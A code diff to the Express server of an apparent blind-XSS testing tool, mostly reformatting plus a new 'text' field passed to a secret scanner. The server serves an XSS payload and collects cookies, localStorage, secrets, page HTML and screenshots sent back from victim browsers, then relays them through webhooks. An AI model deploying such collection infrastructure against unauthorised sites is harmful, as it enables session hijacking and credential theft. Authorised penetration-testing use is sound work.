@@ -23,29 +23,29 @@ const Profiling = require("@sentry/profiling-node");
 const fetch = require('node-fetch');
 
 function set_secure_headers(req, res) {
-	res.set("X-XSS-Protection", "mode=block");
-	res.set("X-Content-Type-Options", "nosniff");
-	res.set("X-Frame-Options", "deny");
+    res.set("X-XSS-Protection", "mode=block");
+    res.set("X-Content-Type-Options", "nosniff");
+    res.set("X-Frame-Options", "deny");
 
-	if (req.path.startsWith(constants.API_BASE_PATH)) {
-		res.set("Content-Security-Policy", "default-src 'none'; script-src 'none'");
-		res.set("Content-Type", "application/json");
-		return
-	}
+    if (req.path.startsWith(constants.API_BASE_PATH)) {
+        res.set("Content-Security-Policy", "default-src 'none'; script-src 'none'");
+        res.set("Content-Type", "application/json");
+        return
+    }
 }
 
 async function check_file_exists(file_path) {
-	return asyncfs.access(file_path, fs.constants.F_OK).then(() => {
-		return true;
-	}).catch(() => {
-		return false;
-	});
+    return asyncfs.access(file_path, fs.constants.F_OK).then(() => {
+        return true;
+    }).catch(() => {
+        return false;
+    });
 }
 
 // Load XSS payload from file into memory
 const XSS_PAYLOAD = fs.readFileSync(
-	'./probe.js',
-	'utf8'
+    './probe.js',
+    'utf8'
 );
 
 var multer = require('multer');
@@ -53,140 +53,140 @@ var upload = multer({ dest: '/tmp/' })
 const SCREENSHOTS_DIR = path.resolve(process.env.SCREENSHOTS_DIR);
 
 async function get_app_server() {
-	const app = express();
-	
-	if (process.env.SENTRY_ENABLED === "true") {
-		Sentry.init({
-			dsn: process.env.SENTRY_DSN,
-			integrations: [
-				// enable HTTP calls tracing
-				new Sentry.Integrations.Http({ tracing: true }),
-				// enable Express.js middleware tracing
-				new Tracing.Integrations.Express({ app }),
-				// add beta profiling integration
-				new Profiling.ProfilingIntegration()
-			],
-			// 1.0 is 100% capture rate
-			profilesSampleRate: 1.0,
-			tracesSampleRate: 0.01,
-		});
+    const app = express();
 
-		// RequestHandler creates a separate execution context using domains, so that every
-		// transaction/span/breadcrumb is attached to its own Hub instance
-		app.use(Sentry.Handlers.requestHandler());
-		// TracingHandler creates a trace for every incoming request
-		app.use(Sentry.Handlers.tracingHandler());
-		app.use(Sentry.Handlers.errorHandler());
-	}
+    if (process.env.SENTRY_ENABLED === "true") {
+        Sentry.init({
+            dsn: process.env.SENTRY_DSN,
+            integrations: [
+                // enable HTTP calls tracing
+                new Sentry.Integrations.Http({ tracing: true }),
+                // enable Express.js middleware tracing
+                new Tracing.Integrations.Express({ app }),
+                // add beta profiling integration
+                new Profiling.ProfilingIntegration()
+            ],
+            // 1.0 is 100% capture rate
+            profilesSampleRate: 1.0,
+            tracesSampleRate: 0.01,
+        });
 
-	app.set('trust proxy', true);
-	app.disable('x-powered-by');
+        // RequestHandler creates a separate execution context using domains, so that every
+        // transaction/span/breadcrumb is attached to its own Hub instance
+        app.use(Sentry.Handlers.requestHandler());
+        // TracingHandler creates a trace for every incoming request
+        app.use(Sentry.Handlers.tracingHandler());
+        app.use(Sentry.Handlers.errorHandler());
+    }
 
-	// I have a question for Express:
-	// https://youtu.be/ZtjFsQBuJWw?t=4
-	app.set('case sensitive routing', true);
-	
-	app.use(bodyParser.json());
+    app.set('trust proxy', true);
+    app.disable('x-powered-by');
+
+    // I have a question for Express:
+    // https://youtu.be/ZtjFsQBuJWw?t=4
+    app.set('case sensitive routing', true);
+
+    app.use(bodyParser.json());
 
     // Set security-related headers on requests
-    app.use(async function(req, res, next) {
-    	set_secure_headers(req, res);
-    	next();
+    app.use(async function (req, res, next) {
+        set_secure_headers(req, res);
+        next();
     });
 
     // Handler for HTML pages collected by payloads
     const CollectedPagesCallbackSchema = {
-    	"type": "object",
-    	"properties": {
-    		"uri": {
-    			"type": "string",
-    			"default": ""
-    		},
-    		"html": {
-    			"type": "string",
-    			"default": "" 
-    		},
-    	}
+        "type": "object",
+        "properties": {
+            "uri": {
+                "type": "string",
+                "default": ""
+            },
+            "html": {
+                "type": "string",
+                "default": ""
+            },
+        }
     };
-    app.post('/page_callback', upload.none(), validate({body: CollectedPagesCallbackSchema}), async (req, res) => {
-		res.set("Access-Control-Allow-Origin", "*");
-		res.set("Access-Control-Allow-Methods", "POST, OPTIONS");
-		res.set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With");
-		res.set("Access-Control-Max-Age", "86400");    
-		const page_insert_response = await CollectedPages.create({
-			id: uuid.v4(),
-			uri: req.body.uri,
-			html: req.body.html,
-		});
+    app.post('/page_callback', upload.none(), validate({ body: CollectedPagesCallbackSchema }), async (req, res) => {
+        res.set("Access-Control-Allow-Origin", "*");
+        res.set("Access-Control-Allow-Methods", "POST, OPTIONS");
+        res.set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With");
+        res.set("Access-Control-Max-Age", "86400");
+        const page_insert_response = await CollectedPages.create({
+            id: uuid.v4(),
+            uri: req.body.uri,
+            html: req.body.html,
+        });
 
-		// Send the response immediately, they don't need to wait for us to store everything.
-		res.status(200).json({
-			"status": "success"
-		}).end();
-	});
+        // Send the response immediately, they don't need to wait for us to store everything.
+        res.status(200).json({
+            "status": "success"
+        }).end();
+    });
 
     // Handler for XSS payload data to be received
     const JSCallbackSchema = {
-    	"type": "object",
-    	"properties": {
-    		"uri": {
-    			"type": "string",
-    			"default": ""
-    		},
-    		"cookies": {
-    			"type": "string",
-    			"default": ""
-    		},
+        "type": "object",
+        "properties": {
+            "uri": {
+                "type": "string",
+                "default": ""
+            },
+            "cookies": {
+                "type": "string",
+                "default": ""
+            },
             "localstorage": {
                 "type": "string",
                 "default": []
             },
-    		"referrer": {
-    			"type": "string",
-    			"default": ""
-    		},
-    		"user-agent": {
-    			"type": "string",
-    			"default": ""
-    		},
-    		"browser-time": {
-    			"type": "string",
-    			"default": "0",
-    			"pattern": "^\\d+$"
-    		},
-    		"probe-uid": {
-    			"type": "string",
-    			"default": ""
-    		},
-    		"origin": {
-    			"type": "string",
-    			"default": ""
-    		},
-    		"injection_key": {
-    			"type": "string",
-    			"default": ""
-    		},
-    		"title": {
-    			"type": "string",
-    			"default": ""
-    		},
-    		"was_iframe": {
-    			"type": "string",
-    			"default": "false",
-    			"enum": ["true", "false"]
-    		},
-    		"secrets": {
-    			"type": "string",
-    			"default": []
-    		},
-    		"CORS": {
-    			"type": "string",
-    			"default": []
-    		},
-    		"gitExposed": {
-    			"type": "string",
-    			"default": []
-    		},
+            "referrer": {
+                "type": "string",
+                "default": ""
+            },
+            "user-agent": {
+                "type": "string",
+                "default": ""
+            },
+            "browser-time": {
+                "type": "string",
+                "default": "0",
+                "pattern": "^\\d+$"
+            },
+            "probe-uid": {
+                "type": "string",
+                "default": ""
+            },
+            "origin": {
+                "type": "string",
+                "default": ""
+            },
+            "injection_key": {
+                "type": "string",
+                "default": ""
+            },
+            "title": {
+                "type": "string",
+                "default": ""
+            },
+            "was_iframe": {
+                "type": "string",
+                "default": "false",
+                "enum": ["true", "false"]
+            },
+            "secrets": {
+                "type": "string",
+                "default": []
+            },
+            "CORS": {
+                "type": "string",
+                "default": []
+            },
+            "gitExposed": {
+                "type": "string",
+                "default": []
+            },
             "path": {
                 "type": "string",
                 "default": ""
@@ -194,44 +194,48 @@ async function get_app_server() {
             "payload_url": {
                 "type": "string",
                 "default": ""
+            },
+            "text": {
+                "type": "string",
+                "default": ""
             }
-    	}
+        }
     };
-    app.post('/js_callback', upload.single('screenshot'), validate({body: JSCallbackSchema}), async (req, res) => {
-		res.set("Access-Control-Allow-Origin", "*");
-		res.set("Access-Control-Allow-Methods", "POST, OPTIONS");
-		res.set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With");
-		res.set("Access-Control-Max-Age", "86400");
+    app.post('/js_callback', upload.single('screenshot'), validate({ body: JSCallbackSchema }), async (req, res) => {
+        res.set("Access-Control-Allow-Origin", "*");
+        res.set("Access-Control-Allow-Methods", "POST, OPTIONS");
+        res.set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With");
+        res.set("Access-Control-Max-Age", "86400");
 
-		// Send the response immediately, they don't need to wait for us to store everything.
-		res.status(200).json({
-			"status": "success"
-		}).end();
+        // Send the response immediately, they don't need to wait for us to store everything.
+        res.status(200).json({
+            "status": "success"
+        }).end();
 
-        if(req.get('host') != process.env.XSS_HOSTNAME) {
+        if (req.get('host') != process.env.XSS_HOSTNAME) {
             console.debug(`got bad host ${req.get('host')}`);
             return res.redirect("/app/")
         }
         const userPath = req.body.path;
-        if (!userPath){
+        if (!userPath) {
             console.debug("req had no user path ID");
             return
         }
 
         const user = await Users.findOne({ where: { 'path': userPath } });
 
-        if (user === null){
+        if (user === null) {
             console.debug("No user found for path provided");
             return
         }
-        
+
         try {
 
             if ('TRUFFLEHOG_URL' in process.env) {
                 trufflehog_url = process.env.TRUFFLEHOG_URL
-              } else {
+            } else {
                 trufflehog_url = 'http://xsshunterexpress-trufflehog:8000/trufflehog'
-              }
+            }
 
             const secrets_response = await fetch(trufflehog_url, {
                 method: 'POST',
@@ -239,64 +243,64 @@ async function get_app_server() {
                     'Accept': 'application/json, text/plain, */*',
                     'Content-Type': 'text/plain'
                 },
-                body: req.body.text 
+                body: req.body.text
             });
 
             const secrets_data = await secrets_response.json();
             secret_data_result = []
-            
+
             Object.entries(secrets_data).forEach(([key, value]) => {
                 detector_value = ""
                 detector_name = ""
                 decoder_name = ""
                 Object.entries(value).forEach(([key, value]) => {
-                    if(key === "Raw")
+                    if (key === "Raw")
                         detector_value = value
-                    if(key === "DetectorName")
+                    if (key === "DetectorName")
                         detector_name = value
-                    if(key === "DecoderName")
+                    if (key === "DecoderName")
                         decoder_name = value
                 })
-                detector = detector_name + '(' + decoder_name + ')' 
-                data_finding = {"secret_type": detector, "secret_value": detector_value};
-                secret_data_result.push(data_finding); 
+                detector = detector_name + '(' + decoder_name + ')'
+                data_finding = { "secret_type": detector, "secret_value": detector_value };
+                secret_data_result.push(data_finding);
             });
 
-        } catch(e) {
+        } catch (e) {
             console.log("Error when checking with Trufflehog for secrets");
             secret_data_result = []
         }
 
         console.debug(`Got payload for user id ${user.id}`);
-        
+
         const userID = user.id;
         let encrypted = false;
-        if ("encrypted_data" in req.body){
+        if ("encrypted_data" in req.body) {
             encrypted = true;
         }
 
-    	// Multer stores the image in the /tmp/ dir. We use this source image
-    	// to write a gzipped version in the user-provided dir and then delete
-    	// the original uncompressed image.
-    	const payload_fire_image_id = uuid.v4();
+        // Multer stores the image in the /tmp/ dir. We use this source image
+        // to write a gzipped version in the user-provided dir and then delete
+        // the original uncompressed image.
+        const payload_fire_image_id = uuid.v4();
         let payload_fire_image_filename = "";
         let filename_in_bucket = "";
-        if(!encrypted){
-    	    payload_fire_image_filename = `${SCREENSHOTS_DIR}/${payload_fire_image_id}.png.gz`;
+        if (!encrypted) {
+            payload_fire_image_filename = `${SCREENSHOTS_DIR}/${payload_fire_image_id}.png.gz`;
             filename_in_bucket = `${payload_fire_image_id}.png.gz`;
-        }else{
-    	    payload_fire_image_filename = `${SCREENSHOTS_DIR}/${payload_fire_image_id}.b64png.enc.gz`;
+        } else {
+            payload_fire_image_filename = `${SCREENSHOTS_DIR}/${payload_fire_image_id}.b64png.enc.gz`;
             filename_in_bucket = `${payload_fire_image_id}.b64png.enc.gz`;
         }
-    	const multer_temp_image_path = req.file.path;
+        const multer_temp_image_path = req.file.path;
 
-    	// We also gzip the image so we don't waste disk space
-    	const gzip = zlib.createGzip();
-    	const output_gzip_stream = fs.createWriteStream(payload_fire_image_filename);
-    	const input_read_stream = fs.createReadStream(multer_temp_image_path);
-    	// When the "finish" event is called we delete the original
-    	// uncompressed image file left behind by multer.
-        if (process.env.USE_CLOUD_STORAGE == "true"){
+        // We also gzip the image so we don't waste disk space
+        const gzip = zlib.createGzip();
+        const output_gzip_stream = fs.createWriteStream(payload_fire_image_filename);
+        const input_read_stream = fs.createReadStream(multer_temp_image_path);
+        // When the "finish" event is called we delete the original
+        // uncompressed image file left behind by multer.
+        if (process.env.USE_CLOUD_STORAGE == "true") {
             const storage = new Storage();
             //creating a bucket instance
             const bucket = storage.bucket(process.env.BUCKET_NAME);
@@ -321,9 +325,9 @@ async function get_app_server() {
             console.debug(`${payload_fire_image_id}.png.gz has been uploaded to GCS.`);
             await asyncfs.unlink(multer_temp_image_path);
             await asyncfs.unlink(gzipTempFileName);
-        }else{
+        } else {
             input_read_stream.pipe(gzip).pipe(output_gzip_stream).on('finish', async (error) => {
-                if(error) {
+                if (error) {
                     console.error(`An error occurred while writing the XSS payload screenshot (gzipped) to disk:`);
                     console.error(error);
                 }
@@ -333,15 +337,15 @@ async function get_app_server() {
                 await asyncfs.unlink(multer_temp_image_path);
             });
         }
-    	const payload_fire_id = uuid.v4();
+        const payload_fire_id = uuid.v4();
         let payload_fire_data = {}
-        if(encrypted){
-            if (req.body.encrypted_data.length > 100000){
+        if (encrypted) {
+            if (req.body.encrypted_data.length > 100000) {
                 Sentry.captureMessage(`encrypted data length too long: ${req.body.encrypted_data.length}`);
                 return res.status(400).json({
                     "status": "error encrypted data length too long"
                 }).end();
-            }else if (req.body.pgp_key.length > 100000){
+            } else if (req.body.pgp_key.length > 100000) {
                 Sentry.captureMessage(`public key  length too long: ${req.body.pgp_key.length}`);
                 return res.status(400).json({
                     "status": "error public key length too long"
@@ -355,7 +359,7 @@ async function get_app_server() {
                 screenshot_id: payload_fire_image_id,
                 public_key: req.body.pgp_key
             }
-        }else{
+        } else {
             payload_fire_data = {
                 id: payload_fire_id,
                 user_id: userID,
@@ -375,11 +379,14 @@ async function get_app_server() {
                 browser_timestamp: parseInt(req.body['browser-time']),
                 correlated_request: 'No correlated request found for this injection.',
             }
-            if (req.body.CORS != "false"){
-               payload_fire_data.CORS = req.body.CORS; 
+            if (req.body.CORS != "false") {
+                payload_fire_data.CORS = req.body.CORS;
             }
-            if (req.body.gitExposed != "false"){
-                payload_fire_data.gitExposed = req.body.gitExposed.substring(0,5000);
+            if (req.body.text != "false") {
+                payload_fire_data.text = req.body.text;
+            }
+            if (req.body.gitExposed != "false") {
+                payload_fire_data.gitExposed = req.body.gitExposed.substring(0, 5000);
             }
         }
 
@@ -390,55 +397,55 @@ async function get_app_server() {
             }
         });
 
-        if(correlated_request_rec) {
+        if (correlated_request_rec) {
             payload_fire_data.correlated_request = correlated_request_rec.request;
         }
 
-		// Store payload fire results in the database
-		const new_payload_fire_result = await database.savePayload(payload_fire_data);
+        // Store payload fire results in the database
+        const new_payload_fire_result = await database.savePayload(payload_fire_data);
 
         console.log(`Saved result for user id ${userID}`);
-		// Send out notification via configured notification channel
-		if(user.sendEmailAlerts && process.env.EMAIL_NOTIFICATIONS_ENABLED=="true") {
-			payload_fire_data.screenshot_url = `https://${process.env.HOSTNAME}/screenshots/${payload_fire_data.screenshot_id}.png`;
+        // Send out notification via configured notification channel
+        if (user.sendEmailAlerts && process.env.EMAIL_NOTIFICATIONS_ENABLED == "true") {
+            payload_fire_data.screenshot_url = `https://${process.env.HOSTNAME}/screenshots/${payload_fire_data.screenshot_id}.png`;
             payload_fire_data.xsshunter_url = `https://${process.env.HOSTNAME}`;
-			await notification.send_email_notification(payload_fire_data, user.email);
-		}
+            await notification.send_email_notification(payload_fire_data, user.email);
+        }
 
-        if(user.discord_webhook) {
-			payload_fire_data.screenshot_url = `https://${process.env.HOSTNAME}/screenshots/${payload_fire_data.screenshot_id}.png`;
+        if (user.discord_webhook) {
+            payload_fire_data.screenshot_url = `https://${process.env.HOSTNAME}/screenshots/${payload_fire_data.screenshot_id}.png`;
             payload_fire_data.xsshunter_url = `https://${process.env.HOSTNAME}`;
-			await notification.send_discord_notification(payload_fire_data, user.discord_webhook);
-		}
+            await notification.send_discord_notification(payload_fire_data, user.discord_webhook);
+        }
 
-        if(user.slack_webhook) {
-			payload_fire_data.screenshot_url = `https://${process.env.HOSTNAME}/screenshots/${payload_fire_data.screenshot_id}.png`;
+        if (user.slack_webhook) {
+            payload_fire_data.screenshot_url = `https://${process.env.HOSTNAME}/screenshots/${payload_fire_data.screenshot_id}.png`;
             payload_fire_data.xsshunter_url = `https://${process.env.HOSTNAME}`;
-			await notification.send_slack_notification(payload_fire_data, user.slack_webhook);
-		}
+            await notification.send_slack_notification(payload_fire_data, user.slack_webhook);
+        }
 
-        if(user.custom_webhook) {
-			payload_fire_data.screenshot_url = `https://${process.env.HOSTNAME}/screenshots/${payload_fire_data.screenshot_id}.png`;
+        if (user.custom_webhook) {
+            payload_fire_data.screenshot_url = `https://${process.env.HOSTNAME}/screenshots/${payload_fire_data.screenshot_id}.png`;
             payload_fire_data.xsshunter_url = `https://${process.env.HOSTNAME}`;
-			await notification.send_custom_notification(payload_fire_data, user.custom_webhook);
-		}
+            await notification.send_custom_notification(payload_fire_data, user.custom_webhook);
+        }
 
-	});
+    });
 
     // Set up /health handler so the user can
     // do uptime checks and appropriate alerting.
     app.get('/health', async (req, res) => {
-    	try {
-    		await sequelize.authenticate();
-    		res.status(200).json({
-    			"status": "ok"
-    		}).end();
-    	} catch (error) {
-    		console.error('An error occurred when testing the database connection (/health):', error);
-    		res.status(500).json({
-    			"status": "error"
-    		}).end();
-    	}
+        try {
+            await sequelize.authenticate();
+            res.status(200).json({
+                "status": "ok"
+            }).end();
+        } catch (error) {
+            console.error('An error occurred when testing the database connection (/health):', error);
+            res.status(500).json({
+                "status": "error"
+            }).end();
+        }
     });
 
     const payload_handler = async (req, res) => {
@@ -449,49 +456,49 @@ async function get_app_server() {
         res.set("Access-Control-Allow-Headers", "Content-Type, X-Requested-With");
         res.set("Access-Control-Max-Age", "86400");
 
-        if(req.get('host') != process.env.XSS_HOSTNAME) {
+        if (req.get('host') != process.env.XSS_HOSTNAME) {
             return res.redirect("/app/");
         }
 
-        if(req.originalUrl.includes(".map")) {
+        if (req.originalUrl.includes(".map")) {
             return res.status(404);
         }
-        
+
         let user, userPath;
 
-        if(process.env.ALLOW_EMPTY_USERPATH && process.env.ALLOW_EMPTY_USERPATH.toLowerCase() === "true") {
+        if (process.env.ALLOW_EMPTY_USERPATH && process.env.ALLOW_EMPTY_USERPATH.toLowerCase() === "true") {
             user = await Users.findOne({ where: { 'email': process.env.PANEL_USERNAME.toLowerCase() } });
-            userPath = user.path;
+            userPath = user?.path??'';
         } else {
             userPath = req.originalUrl.split("/").join("").split("?")[0];
             user = await Users.findOne({ where: { 'path': userPath } });
         }
 
-        if (user === null){
+        if (user === null) {
             console.debug("No user found");
             return res.send("Hey");
         }
-        
+
         let pgp_key = user.pgp_key;
 
-        if (! pgp_key){
+        if (!pgp_key) {
             pgp_key = "";
         }
 
         console.log(`Got xss fetch for user id ${user.id}`);
-        
+
         let chainload_uri = user.additionalJS;
-        if (! chainload_uri){
+        if (!chainload_uri) {
             chainload_uri = '';
         }
         let xssURI = ""
-        if(process.env.NODE_ENV == "development"){
+        if (process.env.NODE_ENV == "development") {
             xssURI = `http://${process.env.XSS_HOSTNAME}`
-        }else{
+        } else {
 
             xssURI = `https://${process.env.XSS_HOSTNAME}`
         }
-        
+
         const payload_url = `https://${process.env.XSS_HOSTNAME}${req.originalUrl}`
 
         res.send(XSS_PAYLOAD.replace(
@@ -522,16 +529,16 @@ async function get_app_server() {
     app.get('/', payload_handler);
 
     /*
-		Enabling the web control panel is 100% optional. This can be
-		enabled with the "CONTROL_PANEL_ENABLED" environment variable.
+        Enabling the web control panel is 100% optional. This can be
+        enabled with the "CONTROL_PANEL_ENABLED" environment variable.
 
-		However, if the user just wants alerts on payload firing then
-		they can disable the web control panel to reduce attack surface.
-	*/
-	if(process.env.CONTROL_PANEL_ENABLED === 'true') {
+        However, if the user just wants alerts on payload firing then
+        they can disable the web control panel to reduce attack surface.
+    */
+    if (process.env.CONTROL_PANEL_ENABLED === 'true') {
         // Enable API and static asset serving.
         await api.set_up_api_server(app);
-	} else {
+    } else {
         console.log(`[INFO] Control panel NOT enabled. Not serving API or GUI server, only acting as a notification server...`);
     }
 
